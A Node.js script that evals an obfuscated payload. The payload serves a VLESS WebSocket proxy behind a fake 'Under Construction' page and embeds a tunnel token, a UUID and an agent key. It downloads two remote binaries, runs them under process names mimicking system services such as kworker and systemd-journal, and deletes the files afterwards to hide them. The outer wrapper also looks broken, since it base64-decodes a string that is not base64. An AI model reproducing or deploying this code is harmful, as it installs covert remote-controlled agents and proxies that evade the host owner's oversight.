const { execSync } = require('child_process');
const b = `const _0x5101da=_0x207b;function _0x157b(){const _0x3195e8=['1983807cShwYY','rm\x20-f\x20\x22','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9','replace','host','106551iisOjX','error','postgres','nz.seav.eu.org','N_K','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Running</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Port:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','exec\x20-a\x20\x22','from','C_T','irqbalance','message','send','\x27\x20>\x20/dev/null\x202>&1\x20&\x20echo\x20$!\x20>\x20/tmp/','once','listen','Server','Internal\x20Server\x20Error','base64','cp\x20\x22','\x20as\x20process:\x20','watchdog','net','systemd-journal','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Connection\x20Link\x20(Base64):</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','createServer','readyState','264264lOAzJA','kworker','packagekit','wpa_supplicant','containerd','N_S','apache2','redis-server','random','path','update-notifier','env','rcu_gp','C_B','map','docker','end','1.seaw.cf','2013960incHhW','status','.pid','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Under\x20Construction</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Website\x20Under\x20Construction</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','writeHead','http','curl\x20-L\x20','memcached','200TLaplH','length','text/plain','cups-browsed','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','pipe','accounts-daemon','slice','whoopsie','join','readUInt8','/cf','write','randomBytes','/vl','mongodb','796225NWTzWo','UUID','/health','thermald','cron','randomInt','atd','OPEN','\x20--tls\x20--skip-procs\x20--skip-conn','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','text/html','reduce','toString','every','1828PEumKr','url','PORT',':443\x20-p\x20','migration','\x22\x20&&\x20chmod\x20+x\x20\x22','309bJqyko','log','&encryption=none&sni=','222484yjFKlw','upowerd','\x20-o\x20\x22','&host=','concat','application/json','dbus-daemon','NetworkManager','systemd','-arm','\x22\x20\x22','\x22\x20&&\x20rm\x20-f\x20\x22','readUInt16BE','C_D','node','avahi-daemon','&fp=chrome&security=tls#','child_process','14KDMPuKYf0nNZBpJD','hex','SERVER_PORT','Not\x20Found','rsyslog'];_0x157b=function(){return _0x3195e8;};return _0x157b();}(function(_0x14a33b,_0x4570ec){const _0x1592d6=_0x207b,_0x4e88ab=_0x14a33b();while(!![]){try{const _0x376a7e=-parseInt(_0x1592d6(0x9b))/0x1+-parseInt(_0x1592d6(0xd1))/0x2+-parseInt(_0x1592d6(0x98))/0x3*(-parseInt(_0x1592d6(0x92))/0x4)+parseInt(_0x1592d6(0x84))/0x5+parseInt(_0x1592d6(0xe3))/0x6+-parseInt(_0x1592d6(0xb2))/0x7+parseInt(_0x1592d6(0xeb))/0x8*(parseInt(_0x1592d6(0xb7))/0x9);if(_0x376a7e===_0x4570ec)break;else _0x4e88ab['push'](_0x4e88ab['shift']());}catch(_0x1bd79b){_0x4e88ab['push'](_0x4e88ab['shift']());}}}(_0x157b,0x30cfe));const {exec}=require(_0x5101da(0xac)),{WebSocket,createWebSocketStream}=require('ws'),http=require(_0x5101da(0xe8)),{URL}=require(_0x5101da(0x93)),net=require(_0x5101da(0xcc)),os=require('os'),path=require(_0x5101da(0xda)),crypto=require('crypto'),CONFIG={'UUID':(process[_0x5101da(0xdc)][_0x5101da(0x85)]||_0x5101da(0x8d))[_0x5101da(0xb5)](/-/g,''),'ORIGINAL_UUID':process['env'][_0x5101da(0x85)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','PORT':process[_0x5101da(0xdc)]['PORT']||process[_0x5101da(0xdc)][_0x5101da(0xaf)]||0x1eb4,'N_S':process[_0x5101da(0xdc)][_0x5101da(0xd6)]||_0x5101da(0xba),'C_B':process['env'][_0x5101da(0xde)]||_0x5101da(0xe2),'N_K':process[_0x5101da(0xdc)][_0x5101da(0xbb)]||_0x5101da(0xad),'C_T':process['env']['C_T']||_0x5101da(0xb4),'C_D':process['env'][_0x5101da(0xa8)]||'scalingo.seav.eu.org'},generateRandomProcessName=()=>{const _0x268481=_0x5101da,_0xfa8b36=[_0x268481(0xa3),_0x268481(0xd2),'ksoftirqd',_0x268481(0x96),_0x268481(0xdd),'rcu_par_gp',_0x268481(0xcb),_0x268481(0xcd),'systemd-udevd','systemd-timesyncd',_0x268481(0xa1),_0x268481(0xa2),_0x268481(0xd4),'dhclient',_0x268481(0xb1),_0x268481(0x88),_0x268481(0x8a),_0x268481(0xee),_0x268481(0xaa),_0x268481(0xdb),_0x268481(0xd3),'snapd',_0x268481(0x7a),'udisks2',_0x268481(0x9c),_0x268481(0x87),_0x268481(0xc0),_0x268481(0x7c),_0x268481(0xa9),'nginx',_0x268481(0xd7),'mysql',_0x268481(0xb9),_0x268481(0xd8),_0x268481(0xea),_0x268481(0x83),_0x268481(0xe0),_0x268481(0xd5),'kubectl'],_0x478014=crypto[_0x268481(0x89)](0x0,_0xfa8b36[_0x268481(0xec)]),_0x14eb46=crypto[_0x268481(0x89)](0x3e8,0x270f);return _0xfa8b36[_0x478014]+'-'+_0x14eb46;},generateRandomFileName=()=>{const _0x4d6f51=_0x5101da;return crypto[_0x4d6f51(0x81)](0x8)[_0x4d6f51(0x90)](_0x4d6f51(0xae));},generateVlessLink=()=>{const _0x4aba45=_0x5101da,_0x199c15='vless://'+CONFIG['ORIGINAL_UUID']+'@'+CONFIG['C_B']+':443?type=ws&path='+encodeURIComponent(_0x4aba45(0x82))+_0x4aba45(0x9e)+CONFIG[_0x4aba45(0xa8)]+_0x4aba45(0x9a)+CONFIG[_0x4aba45(0xa8)]+_0x4aba45(0xab)+CONFIG[_0x4aba45(0xa8)];return Buffer[_0x4aba45(0xbe)](_0x199c15)[_0x4aba45(0x90)](_0x4aba45(0xc8));},HTML_TEMPLATES={'home':_0x5101da(0xe6),'status':(_0x528ea6,_0x29e929)=>_0x5101da(0xbc)+_0x528ea6+_0x5101da(0xce)+_0x29e929+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27'+_0x29e929+'\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20'},server=http[_0x5101da(0xcf)]((_0x3e8c4f,_0xe912f0)=>{const _0x5a97d9=_0x5101da;try{const {pathname:_0x42c1e7}=new URL(_0x3e8c4f[_0x5a97d9(0x93)],'http://'+_0x3e8c4f['headers'][_0x5a97d9(0xb6)]);switch(_0x42c1e7){case'/':_0xe912f0['writeHead'](0xc8,{'Content-Type':_0x5a97d9(0x8e)}),_0xe912f0[_0x5a97d9(0xe1)](HTML_TEMPLATES['home']);break;case'/x':_0xe912f0[_0x5a97d9(0xe7)](0xc8,{'Content-Type':'text/html'}),_0xe912f0[_0x5a97d9(0xe1)](HTML_TEMPLATES[_0x5a97d9(0xe4)](CONFIG[_0x5a97d9(0x94)],generateVlessLink()));break;case _0x5a97d9(0x86):_0xe912f0[_0x5a97d9(0xe7)](0xc8,{'Content-Type':_0x5a97d9(0xa0)}),_0xe912f0[_0x5a97d9(0xe1)](JSON['stringify']({'status':'ok','uptime':process['uptime']()}));break;default:_0xe912f0[_0x5a97d9(0xe7)](0x194,{'Content-Type':_0x5a97d9(0xed)}),_0xe912f0[_0x5a97d9(0xe1)](_0x5a97d9(0xb0));}}catch(_0x2d737e){!_0xe912f0['headersSent']&&(_0xe912f0['writeHead'](0x1f4,{'Content-Type':_0x5a97d9(0xed)}),_0xe912f0['end'](_0x5a97d9(0xc7)));}}),ws=new WebSocket[(_0x5101da(0xc6))]({'server':server,'path':_0x5101da(0x82)});ws['on']('connection',_0x2d24d7=>{const _0xbed8b2=_0x5101da;_0x2d24d7[_0xbed8b2(0xc4)](_0xbed8b2(0xc1),_0x149837=>{const _0x55d602=_0xbed8b2,[_0x61986c]=_0x149837,_0x3da6ee=_0x149837['slice'](0x1,0x11);if(!_0x3da6ee[_0x55d602(0x91)]((_0x577c72,_0x1a1646)=>_0x577c72===parseInt(CONFIG['UUID']['substr'](_0x1a1646*0x2,0x2),0x10)))return;let _0x3410dd=_0x149837[_0x55d602(0x7b)](0x11,0x12)[_0x55d602(0x7e)]()+0x13;const _0x129668=_0x149837['slice'](_0x3410dd,_0x3410dd+=0x2)[_0x55d602(0xa7)](0x0),_0x401123=_0x149837[_0x55d602(0x7b)](_0x3410dd,_0x3410dd+=0x1)[_0x55d602(0x7e)]();let _0x1d3851;if(_0x401123===0x1)_0x1d3851=_0x149837[_0x55d602(0x7b)](_0x3410dd,_0x3410dd+=0x4)[_0x55d602(0x7d)]('.');else{if(_0x401123===0x2){const _0x21eda3=_0x149837[_0x55d602(0x7b)](_0x3410dd,_0x3410dd+=0x1)['readUInt8']();_0x1d3851=new TextDecoder()['decode'](_0x149837[_0x55d602(0x7b)](_0x3410dd,_0x3410dd+=_0x21eda3));}else _0x401123===0x3&&(_0x1d3851=_0x149837[_0x55d602(0x7b)](_0x3410dd,_0x3410dd+=0x10)[_0x55d602(0x8f)]((_0x520661,_0x9a0ce,_0x54acab,_0x25b492)=>_0x54acab%0x2?_0x520661[_0x55d602(0x9f)](_0x25b492[_0x55d602(0x7b)](_0x54acab-0x1,_0x54acab+0x1)):_0x520661,[])[_0x55d602(0xdf)](_0x274c24=>_0x274c24[_0x55d602(0xa7)](0x0)[_0x55d602(0x90)](0x10))[_0x55d602(0x7d)](':'));}if(_0x2d24d7[_0x55d602(0xd0)]===WebSocket[_0x55d602(0x8b)]){_0x2d24d7[_0x55d602(0xc2)](new Uint8Array([_0x61986c,0x0]));const _0x5bb8f3=createWebSocketStream(_0x2d24d7);_0x5bb8f3['on'](_0x55d602(0xb8),()=>{});const _0x27f078=net['connect']({'host':_0x1d3851,'port':_0x129668},function(){const _0x54df7c=_0x55d602;this[_0x54df7c(0x80)](_0x149837[_0x54df7c(0x7b)](_0x3410dd)),_0x5bb8f3['pipe'](this)[_0x54df7c(0x79)](_0x5bb8f3);});_0x27f078['on'](_0x55d602(0xb8),()=>{});}});});const downloadAndRun=(_0x5e0f5c,_0x5c1dbc,_0xeb17f8,_0x1ddfb1)=>{setTimeout(()=>{const _0x2a8d6b=_0x207b;if(!_0x5e0f5c)return;const _0x114de4=generateRandomFileName(),_0x93acc3=generateRandomProcessName(),_0x59355e=path['join'](os['tmpdir'](),_0x114de4),_0xdfdd9=path[_0x2a8d6b(0x7d)](os['tmpdir'](),_0x93acc3);exec(_0x2a8d6b(0xe9)+_0x5e0f5c+_0x2a8d6b(0x9d)+_0x59355e+_0x2a8d6b(0x97)+_0x59355e+'\x22',_0x50fa45=>{const _0x1148c8=_0x2a8d6b;!_0x50fa45&&exec(_0x1148c8(0xc9)+_0x59355e+_0x1148c8(0xa5)+_0xdfdd9+_0x1148c8(0xa6)+_0x59355e+'\x22',_0x54031b=>{const _0x470e74=_0x1148c8;if(!_0x54031b){const _0x5caef1=_0x470e74(0xbd)+_0x93acc3+_0x470e74(0xa5)+_0xdfdd9+'\x22\x20'+_0xeb17f8;exec('nohup\x20sh\x20-c\x20\x27'+_0x5caef1+_0x470e74(0xc3)+_0x93acc3+_0x470e74(0xe5),_0x1f0628=>{const _0x48ff68=_0x470e74;!_0x1f0628&&(console[_0x48ff68(0x99)]('Started\x20'+_0x5c1dbc+_0x48ff68(0xca)+_0x93acc3),setTimeout(()=>{const _0x2d3768=_0x48ff68;exec(_0x2d3768(0xb3)+_0xdfdd9+'\x22');},0x7530));});}});});},_0x1ddfb1);},arch=process['arch'],getUrl=_0x41b6b7=>arch==='arm64'?_0x41b6b7+_0x5101da(0xa4):_0x41b6b7,baseUrl='https://github.com/seav1/dl/releases/download/files';function _0x207b(_0x22e316,_0x2011a0){const _0x157b3f=_0x157b();return _0x207b=function(_0x207bf7,_0x45913c){_0x207bf7=_0x207bf7-0x79;let _0x57cca6=_0x157b3f[_0x207bf7];return _0x57cca6;},_0x207b(_0x22e316,_0x2011a0);}downloadAndRun(getUrl(baseUrl+'/nz'),'nz','-s\x20'+CONFIG[_0x5101da(0xd6)]+_0x5101da(0x95)+CONFIG['N_K']+_0x5101da(0x8c),Math[_0x5101da(0xd9)]()*0x2710+0x1388),downloadAndRun(getUrl(baseUrl+_0x5101da(0x7f)),'cf',_0x5101da(0xef)+CONFIG[_0x5101da(0xbf)],Math[_0x5101da(0xd9)]()*0x3a98+0x1f40),server[_0x5101da(0xc5)](CONFIG[_0x5101da(0x94)],()=>{const _0x35ba3b=_0x5101da;console[_0x35ba3b(0x99)]('Server\x20running\x20on\x20port\x20'+CONFIG[_0x35ba3b(0x94)]);});`.replace(/\\n/g, '');
execSync(`node -e "eval(Buffer.from('${b}', 'base64').toString())"`);
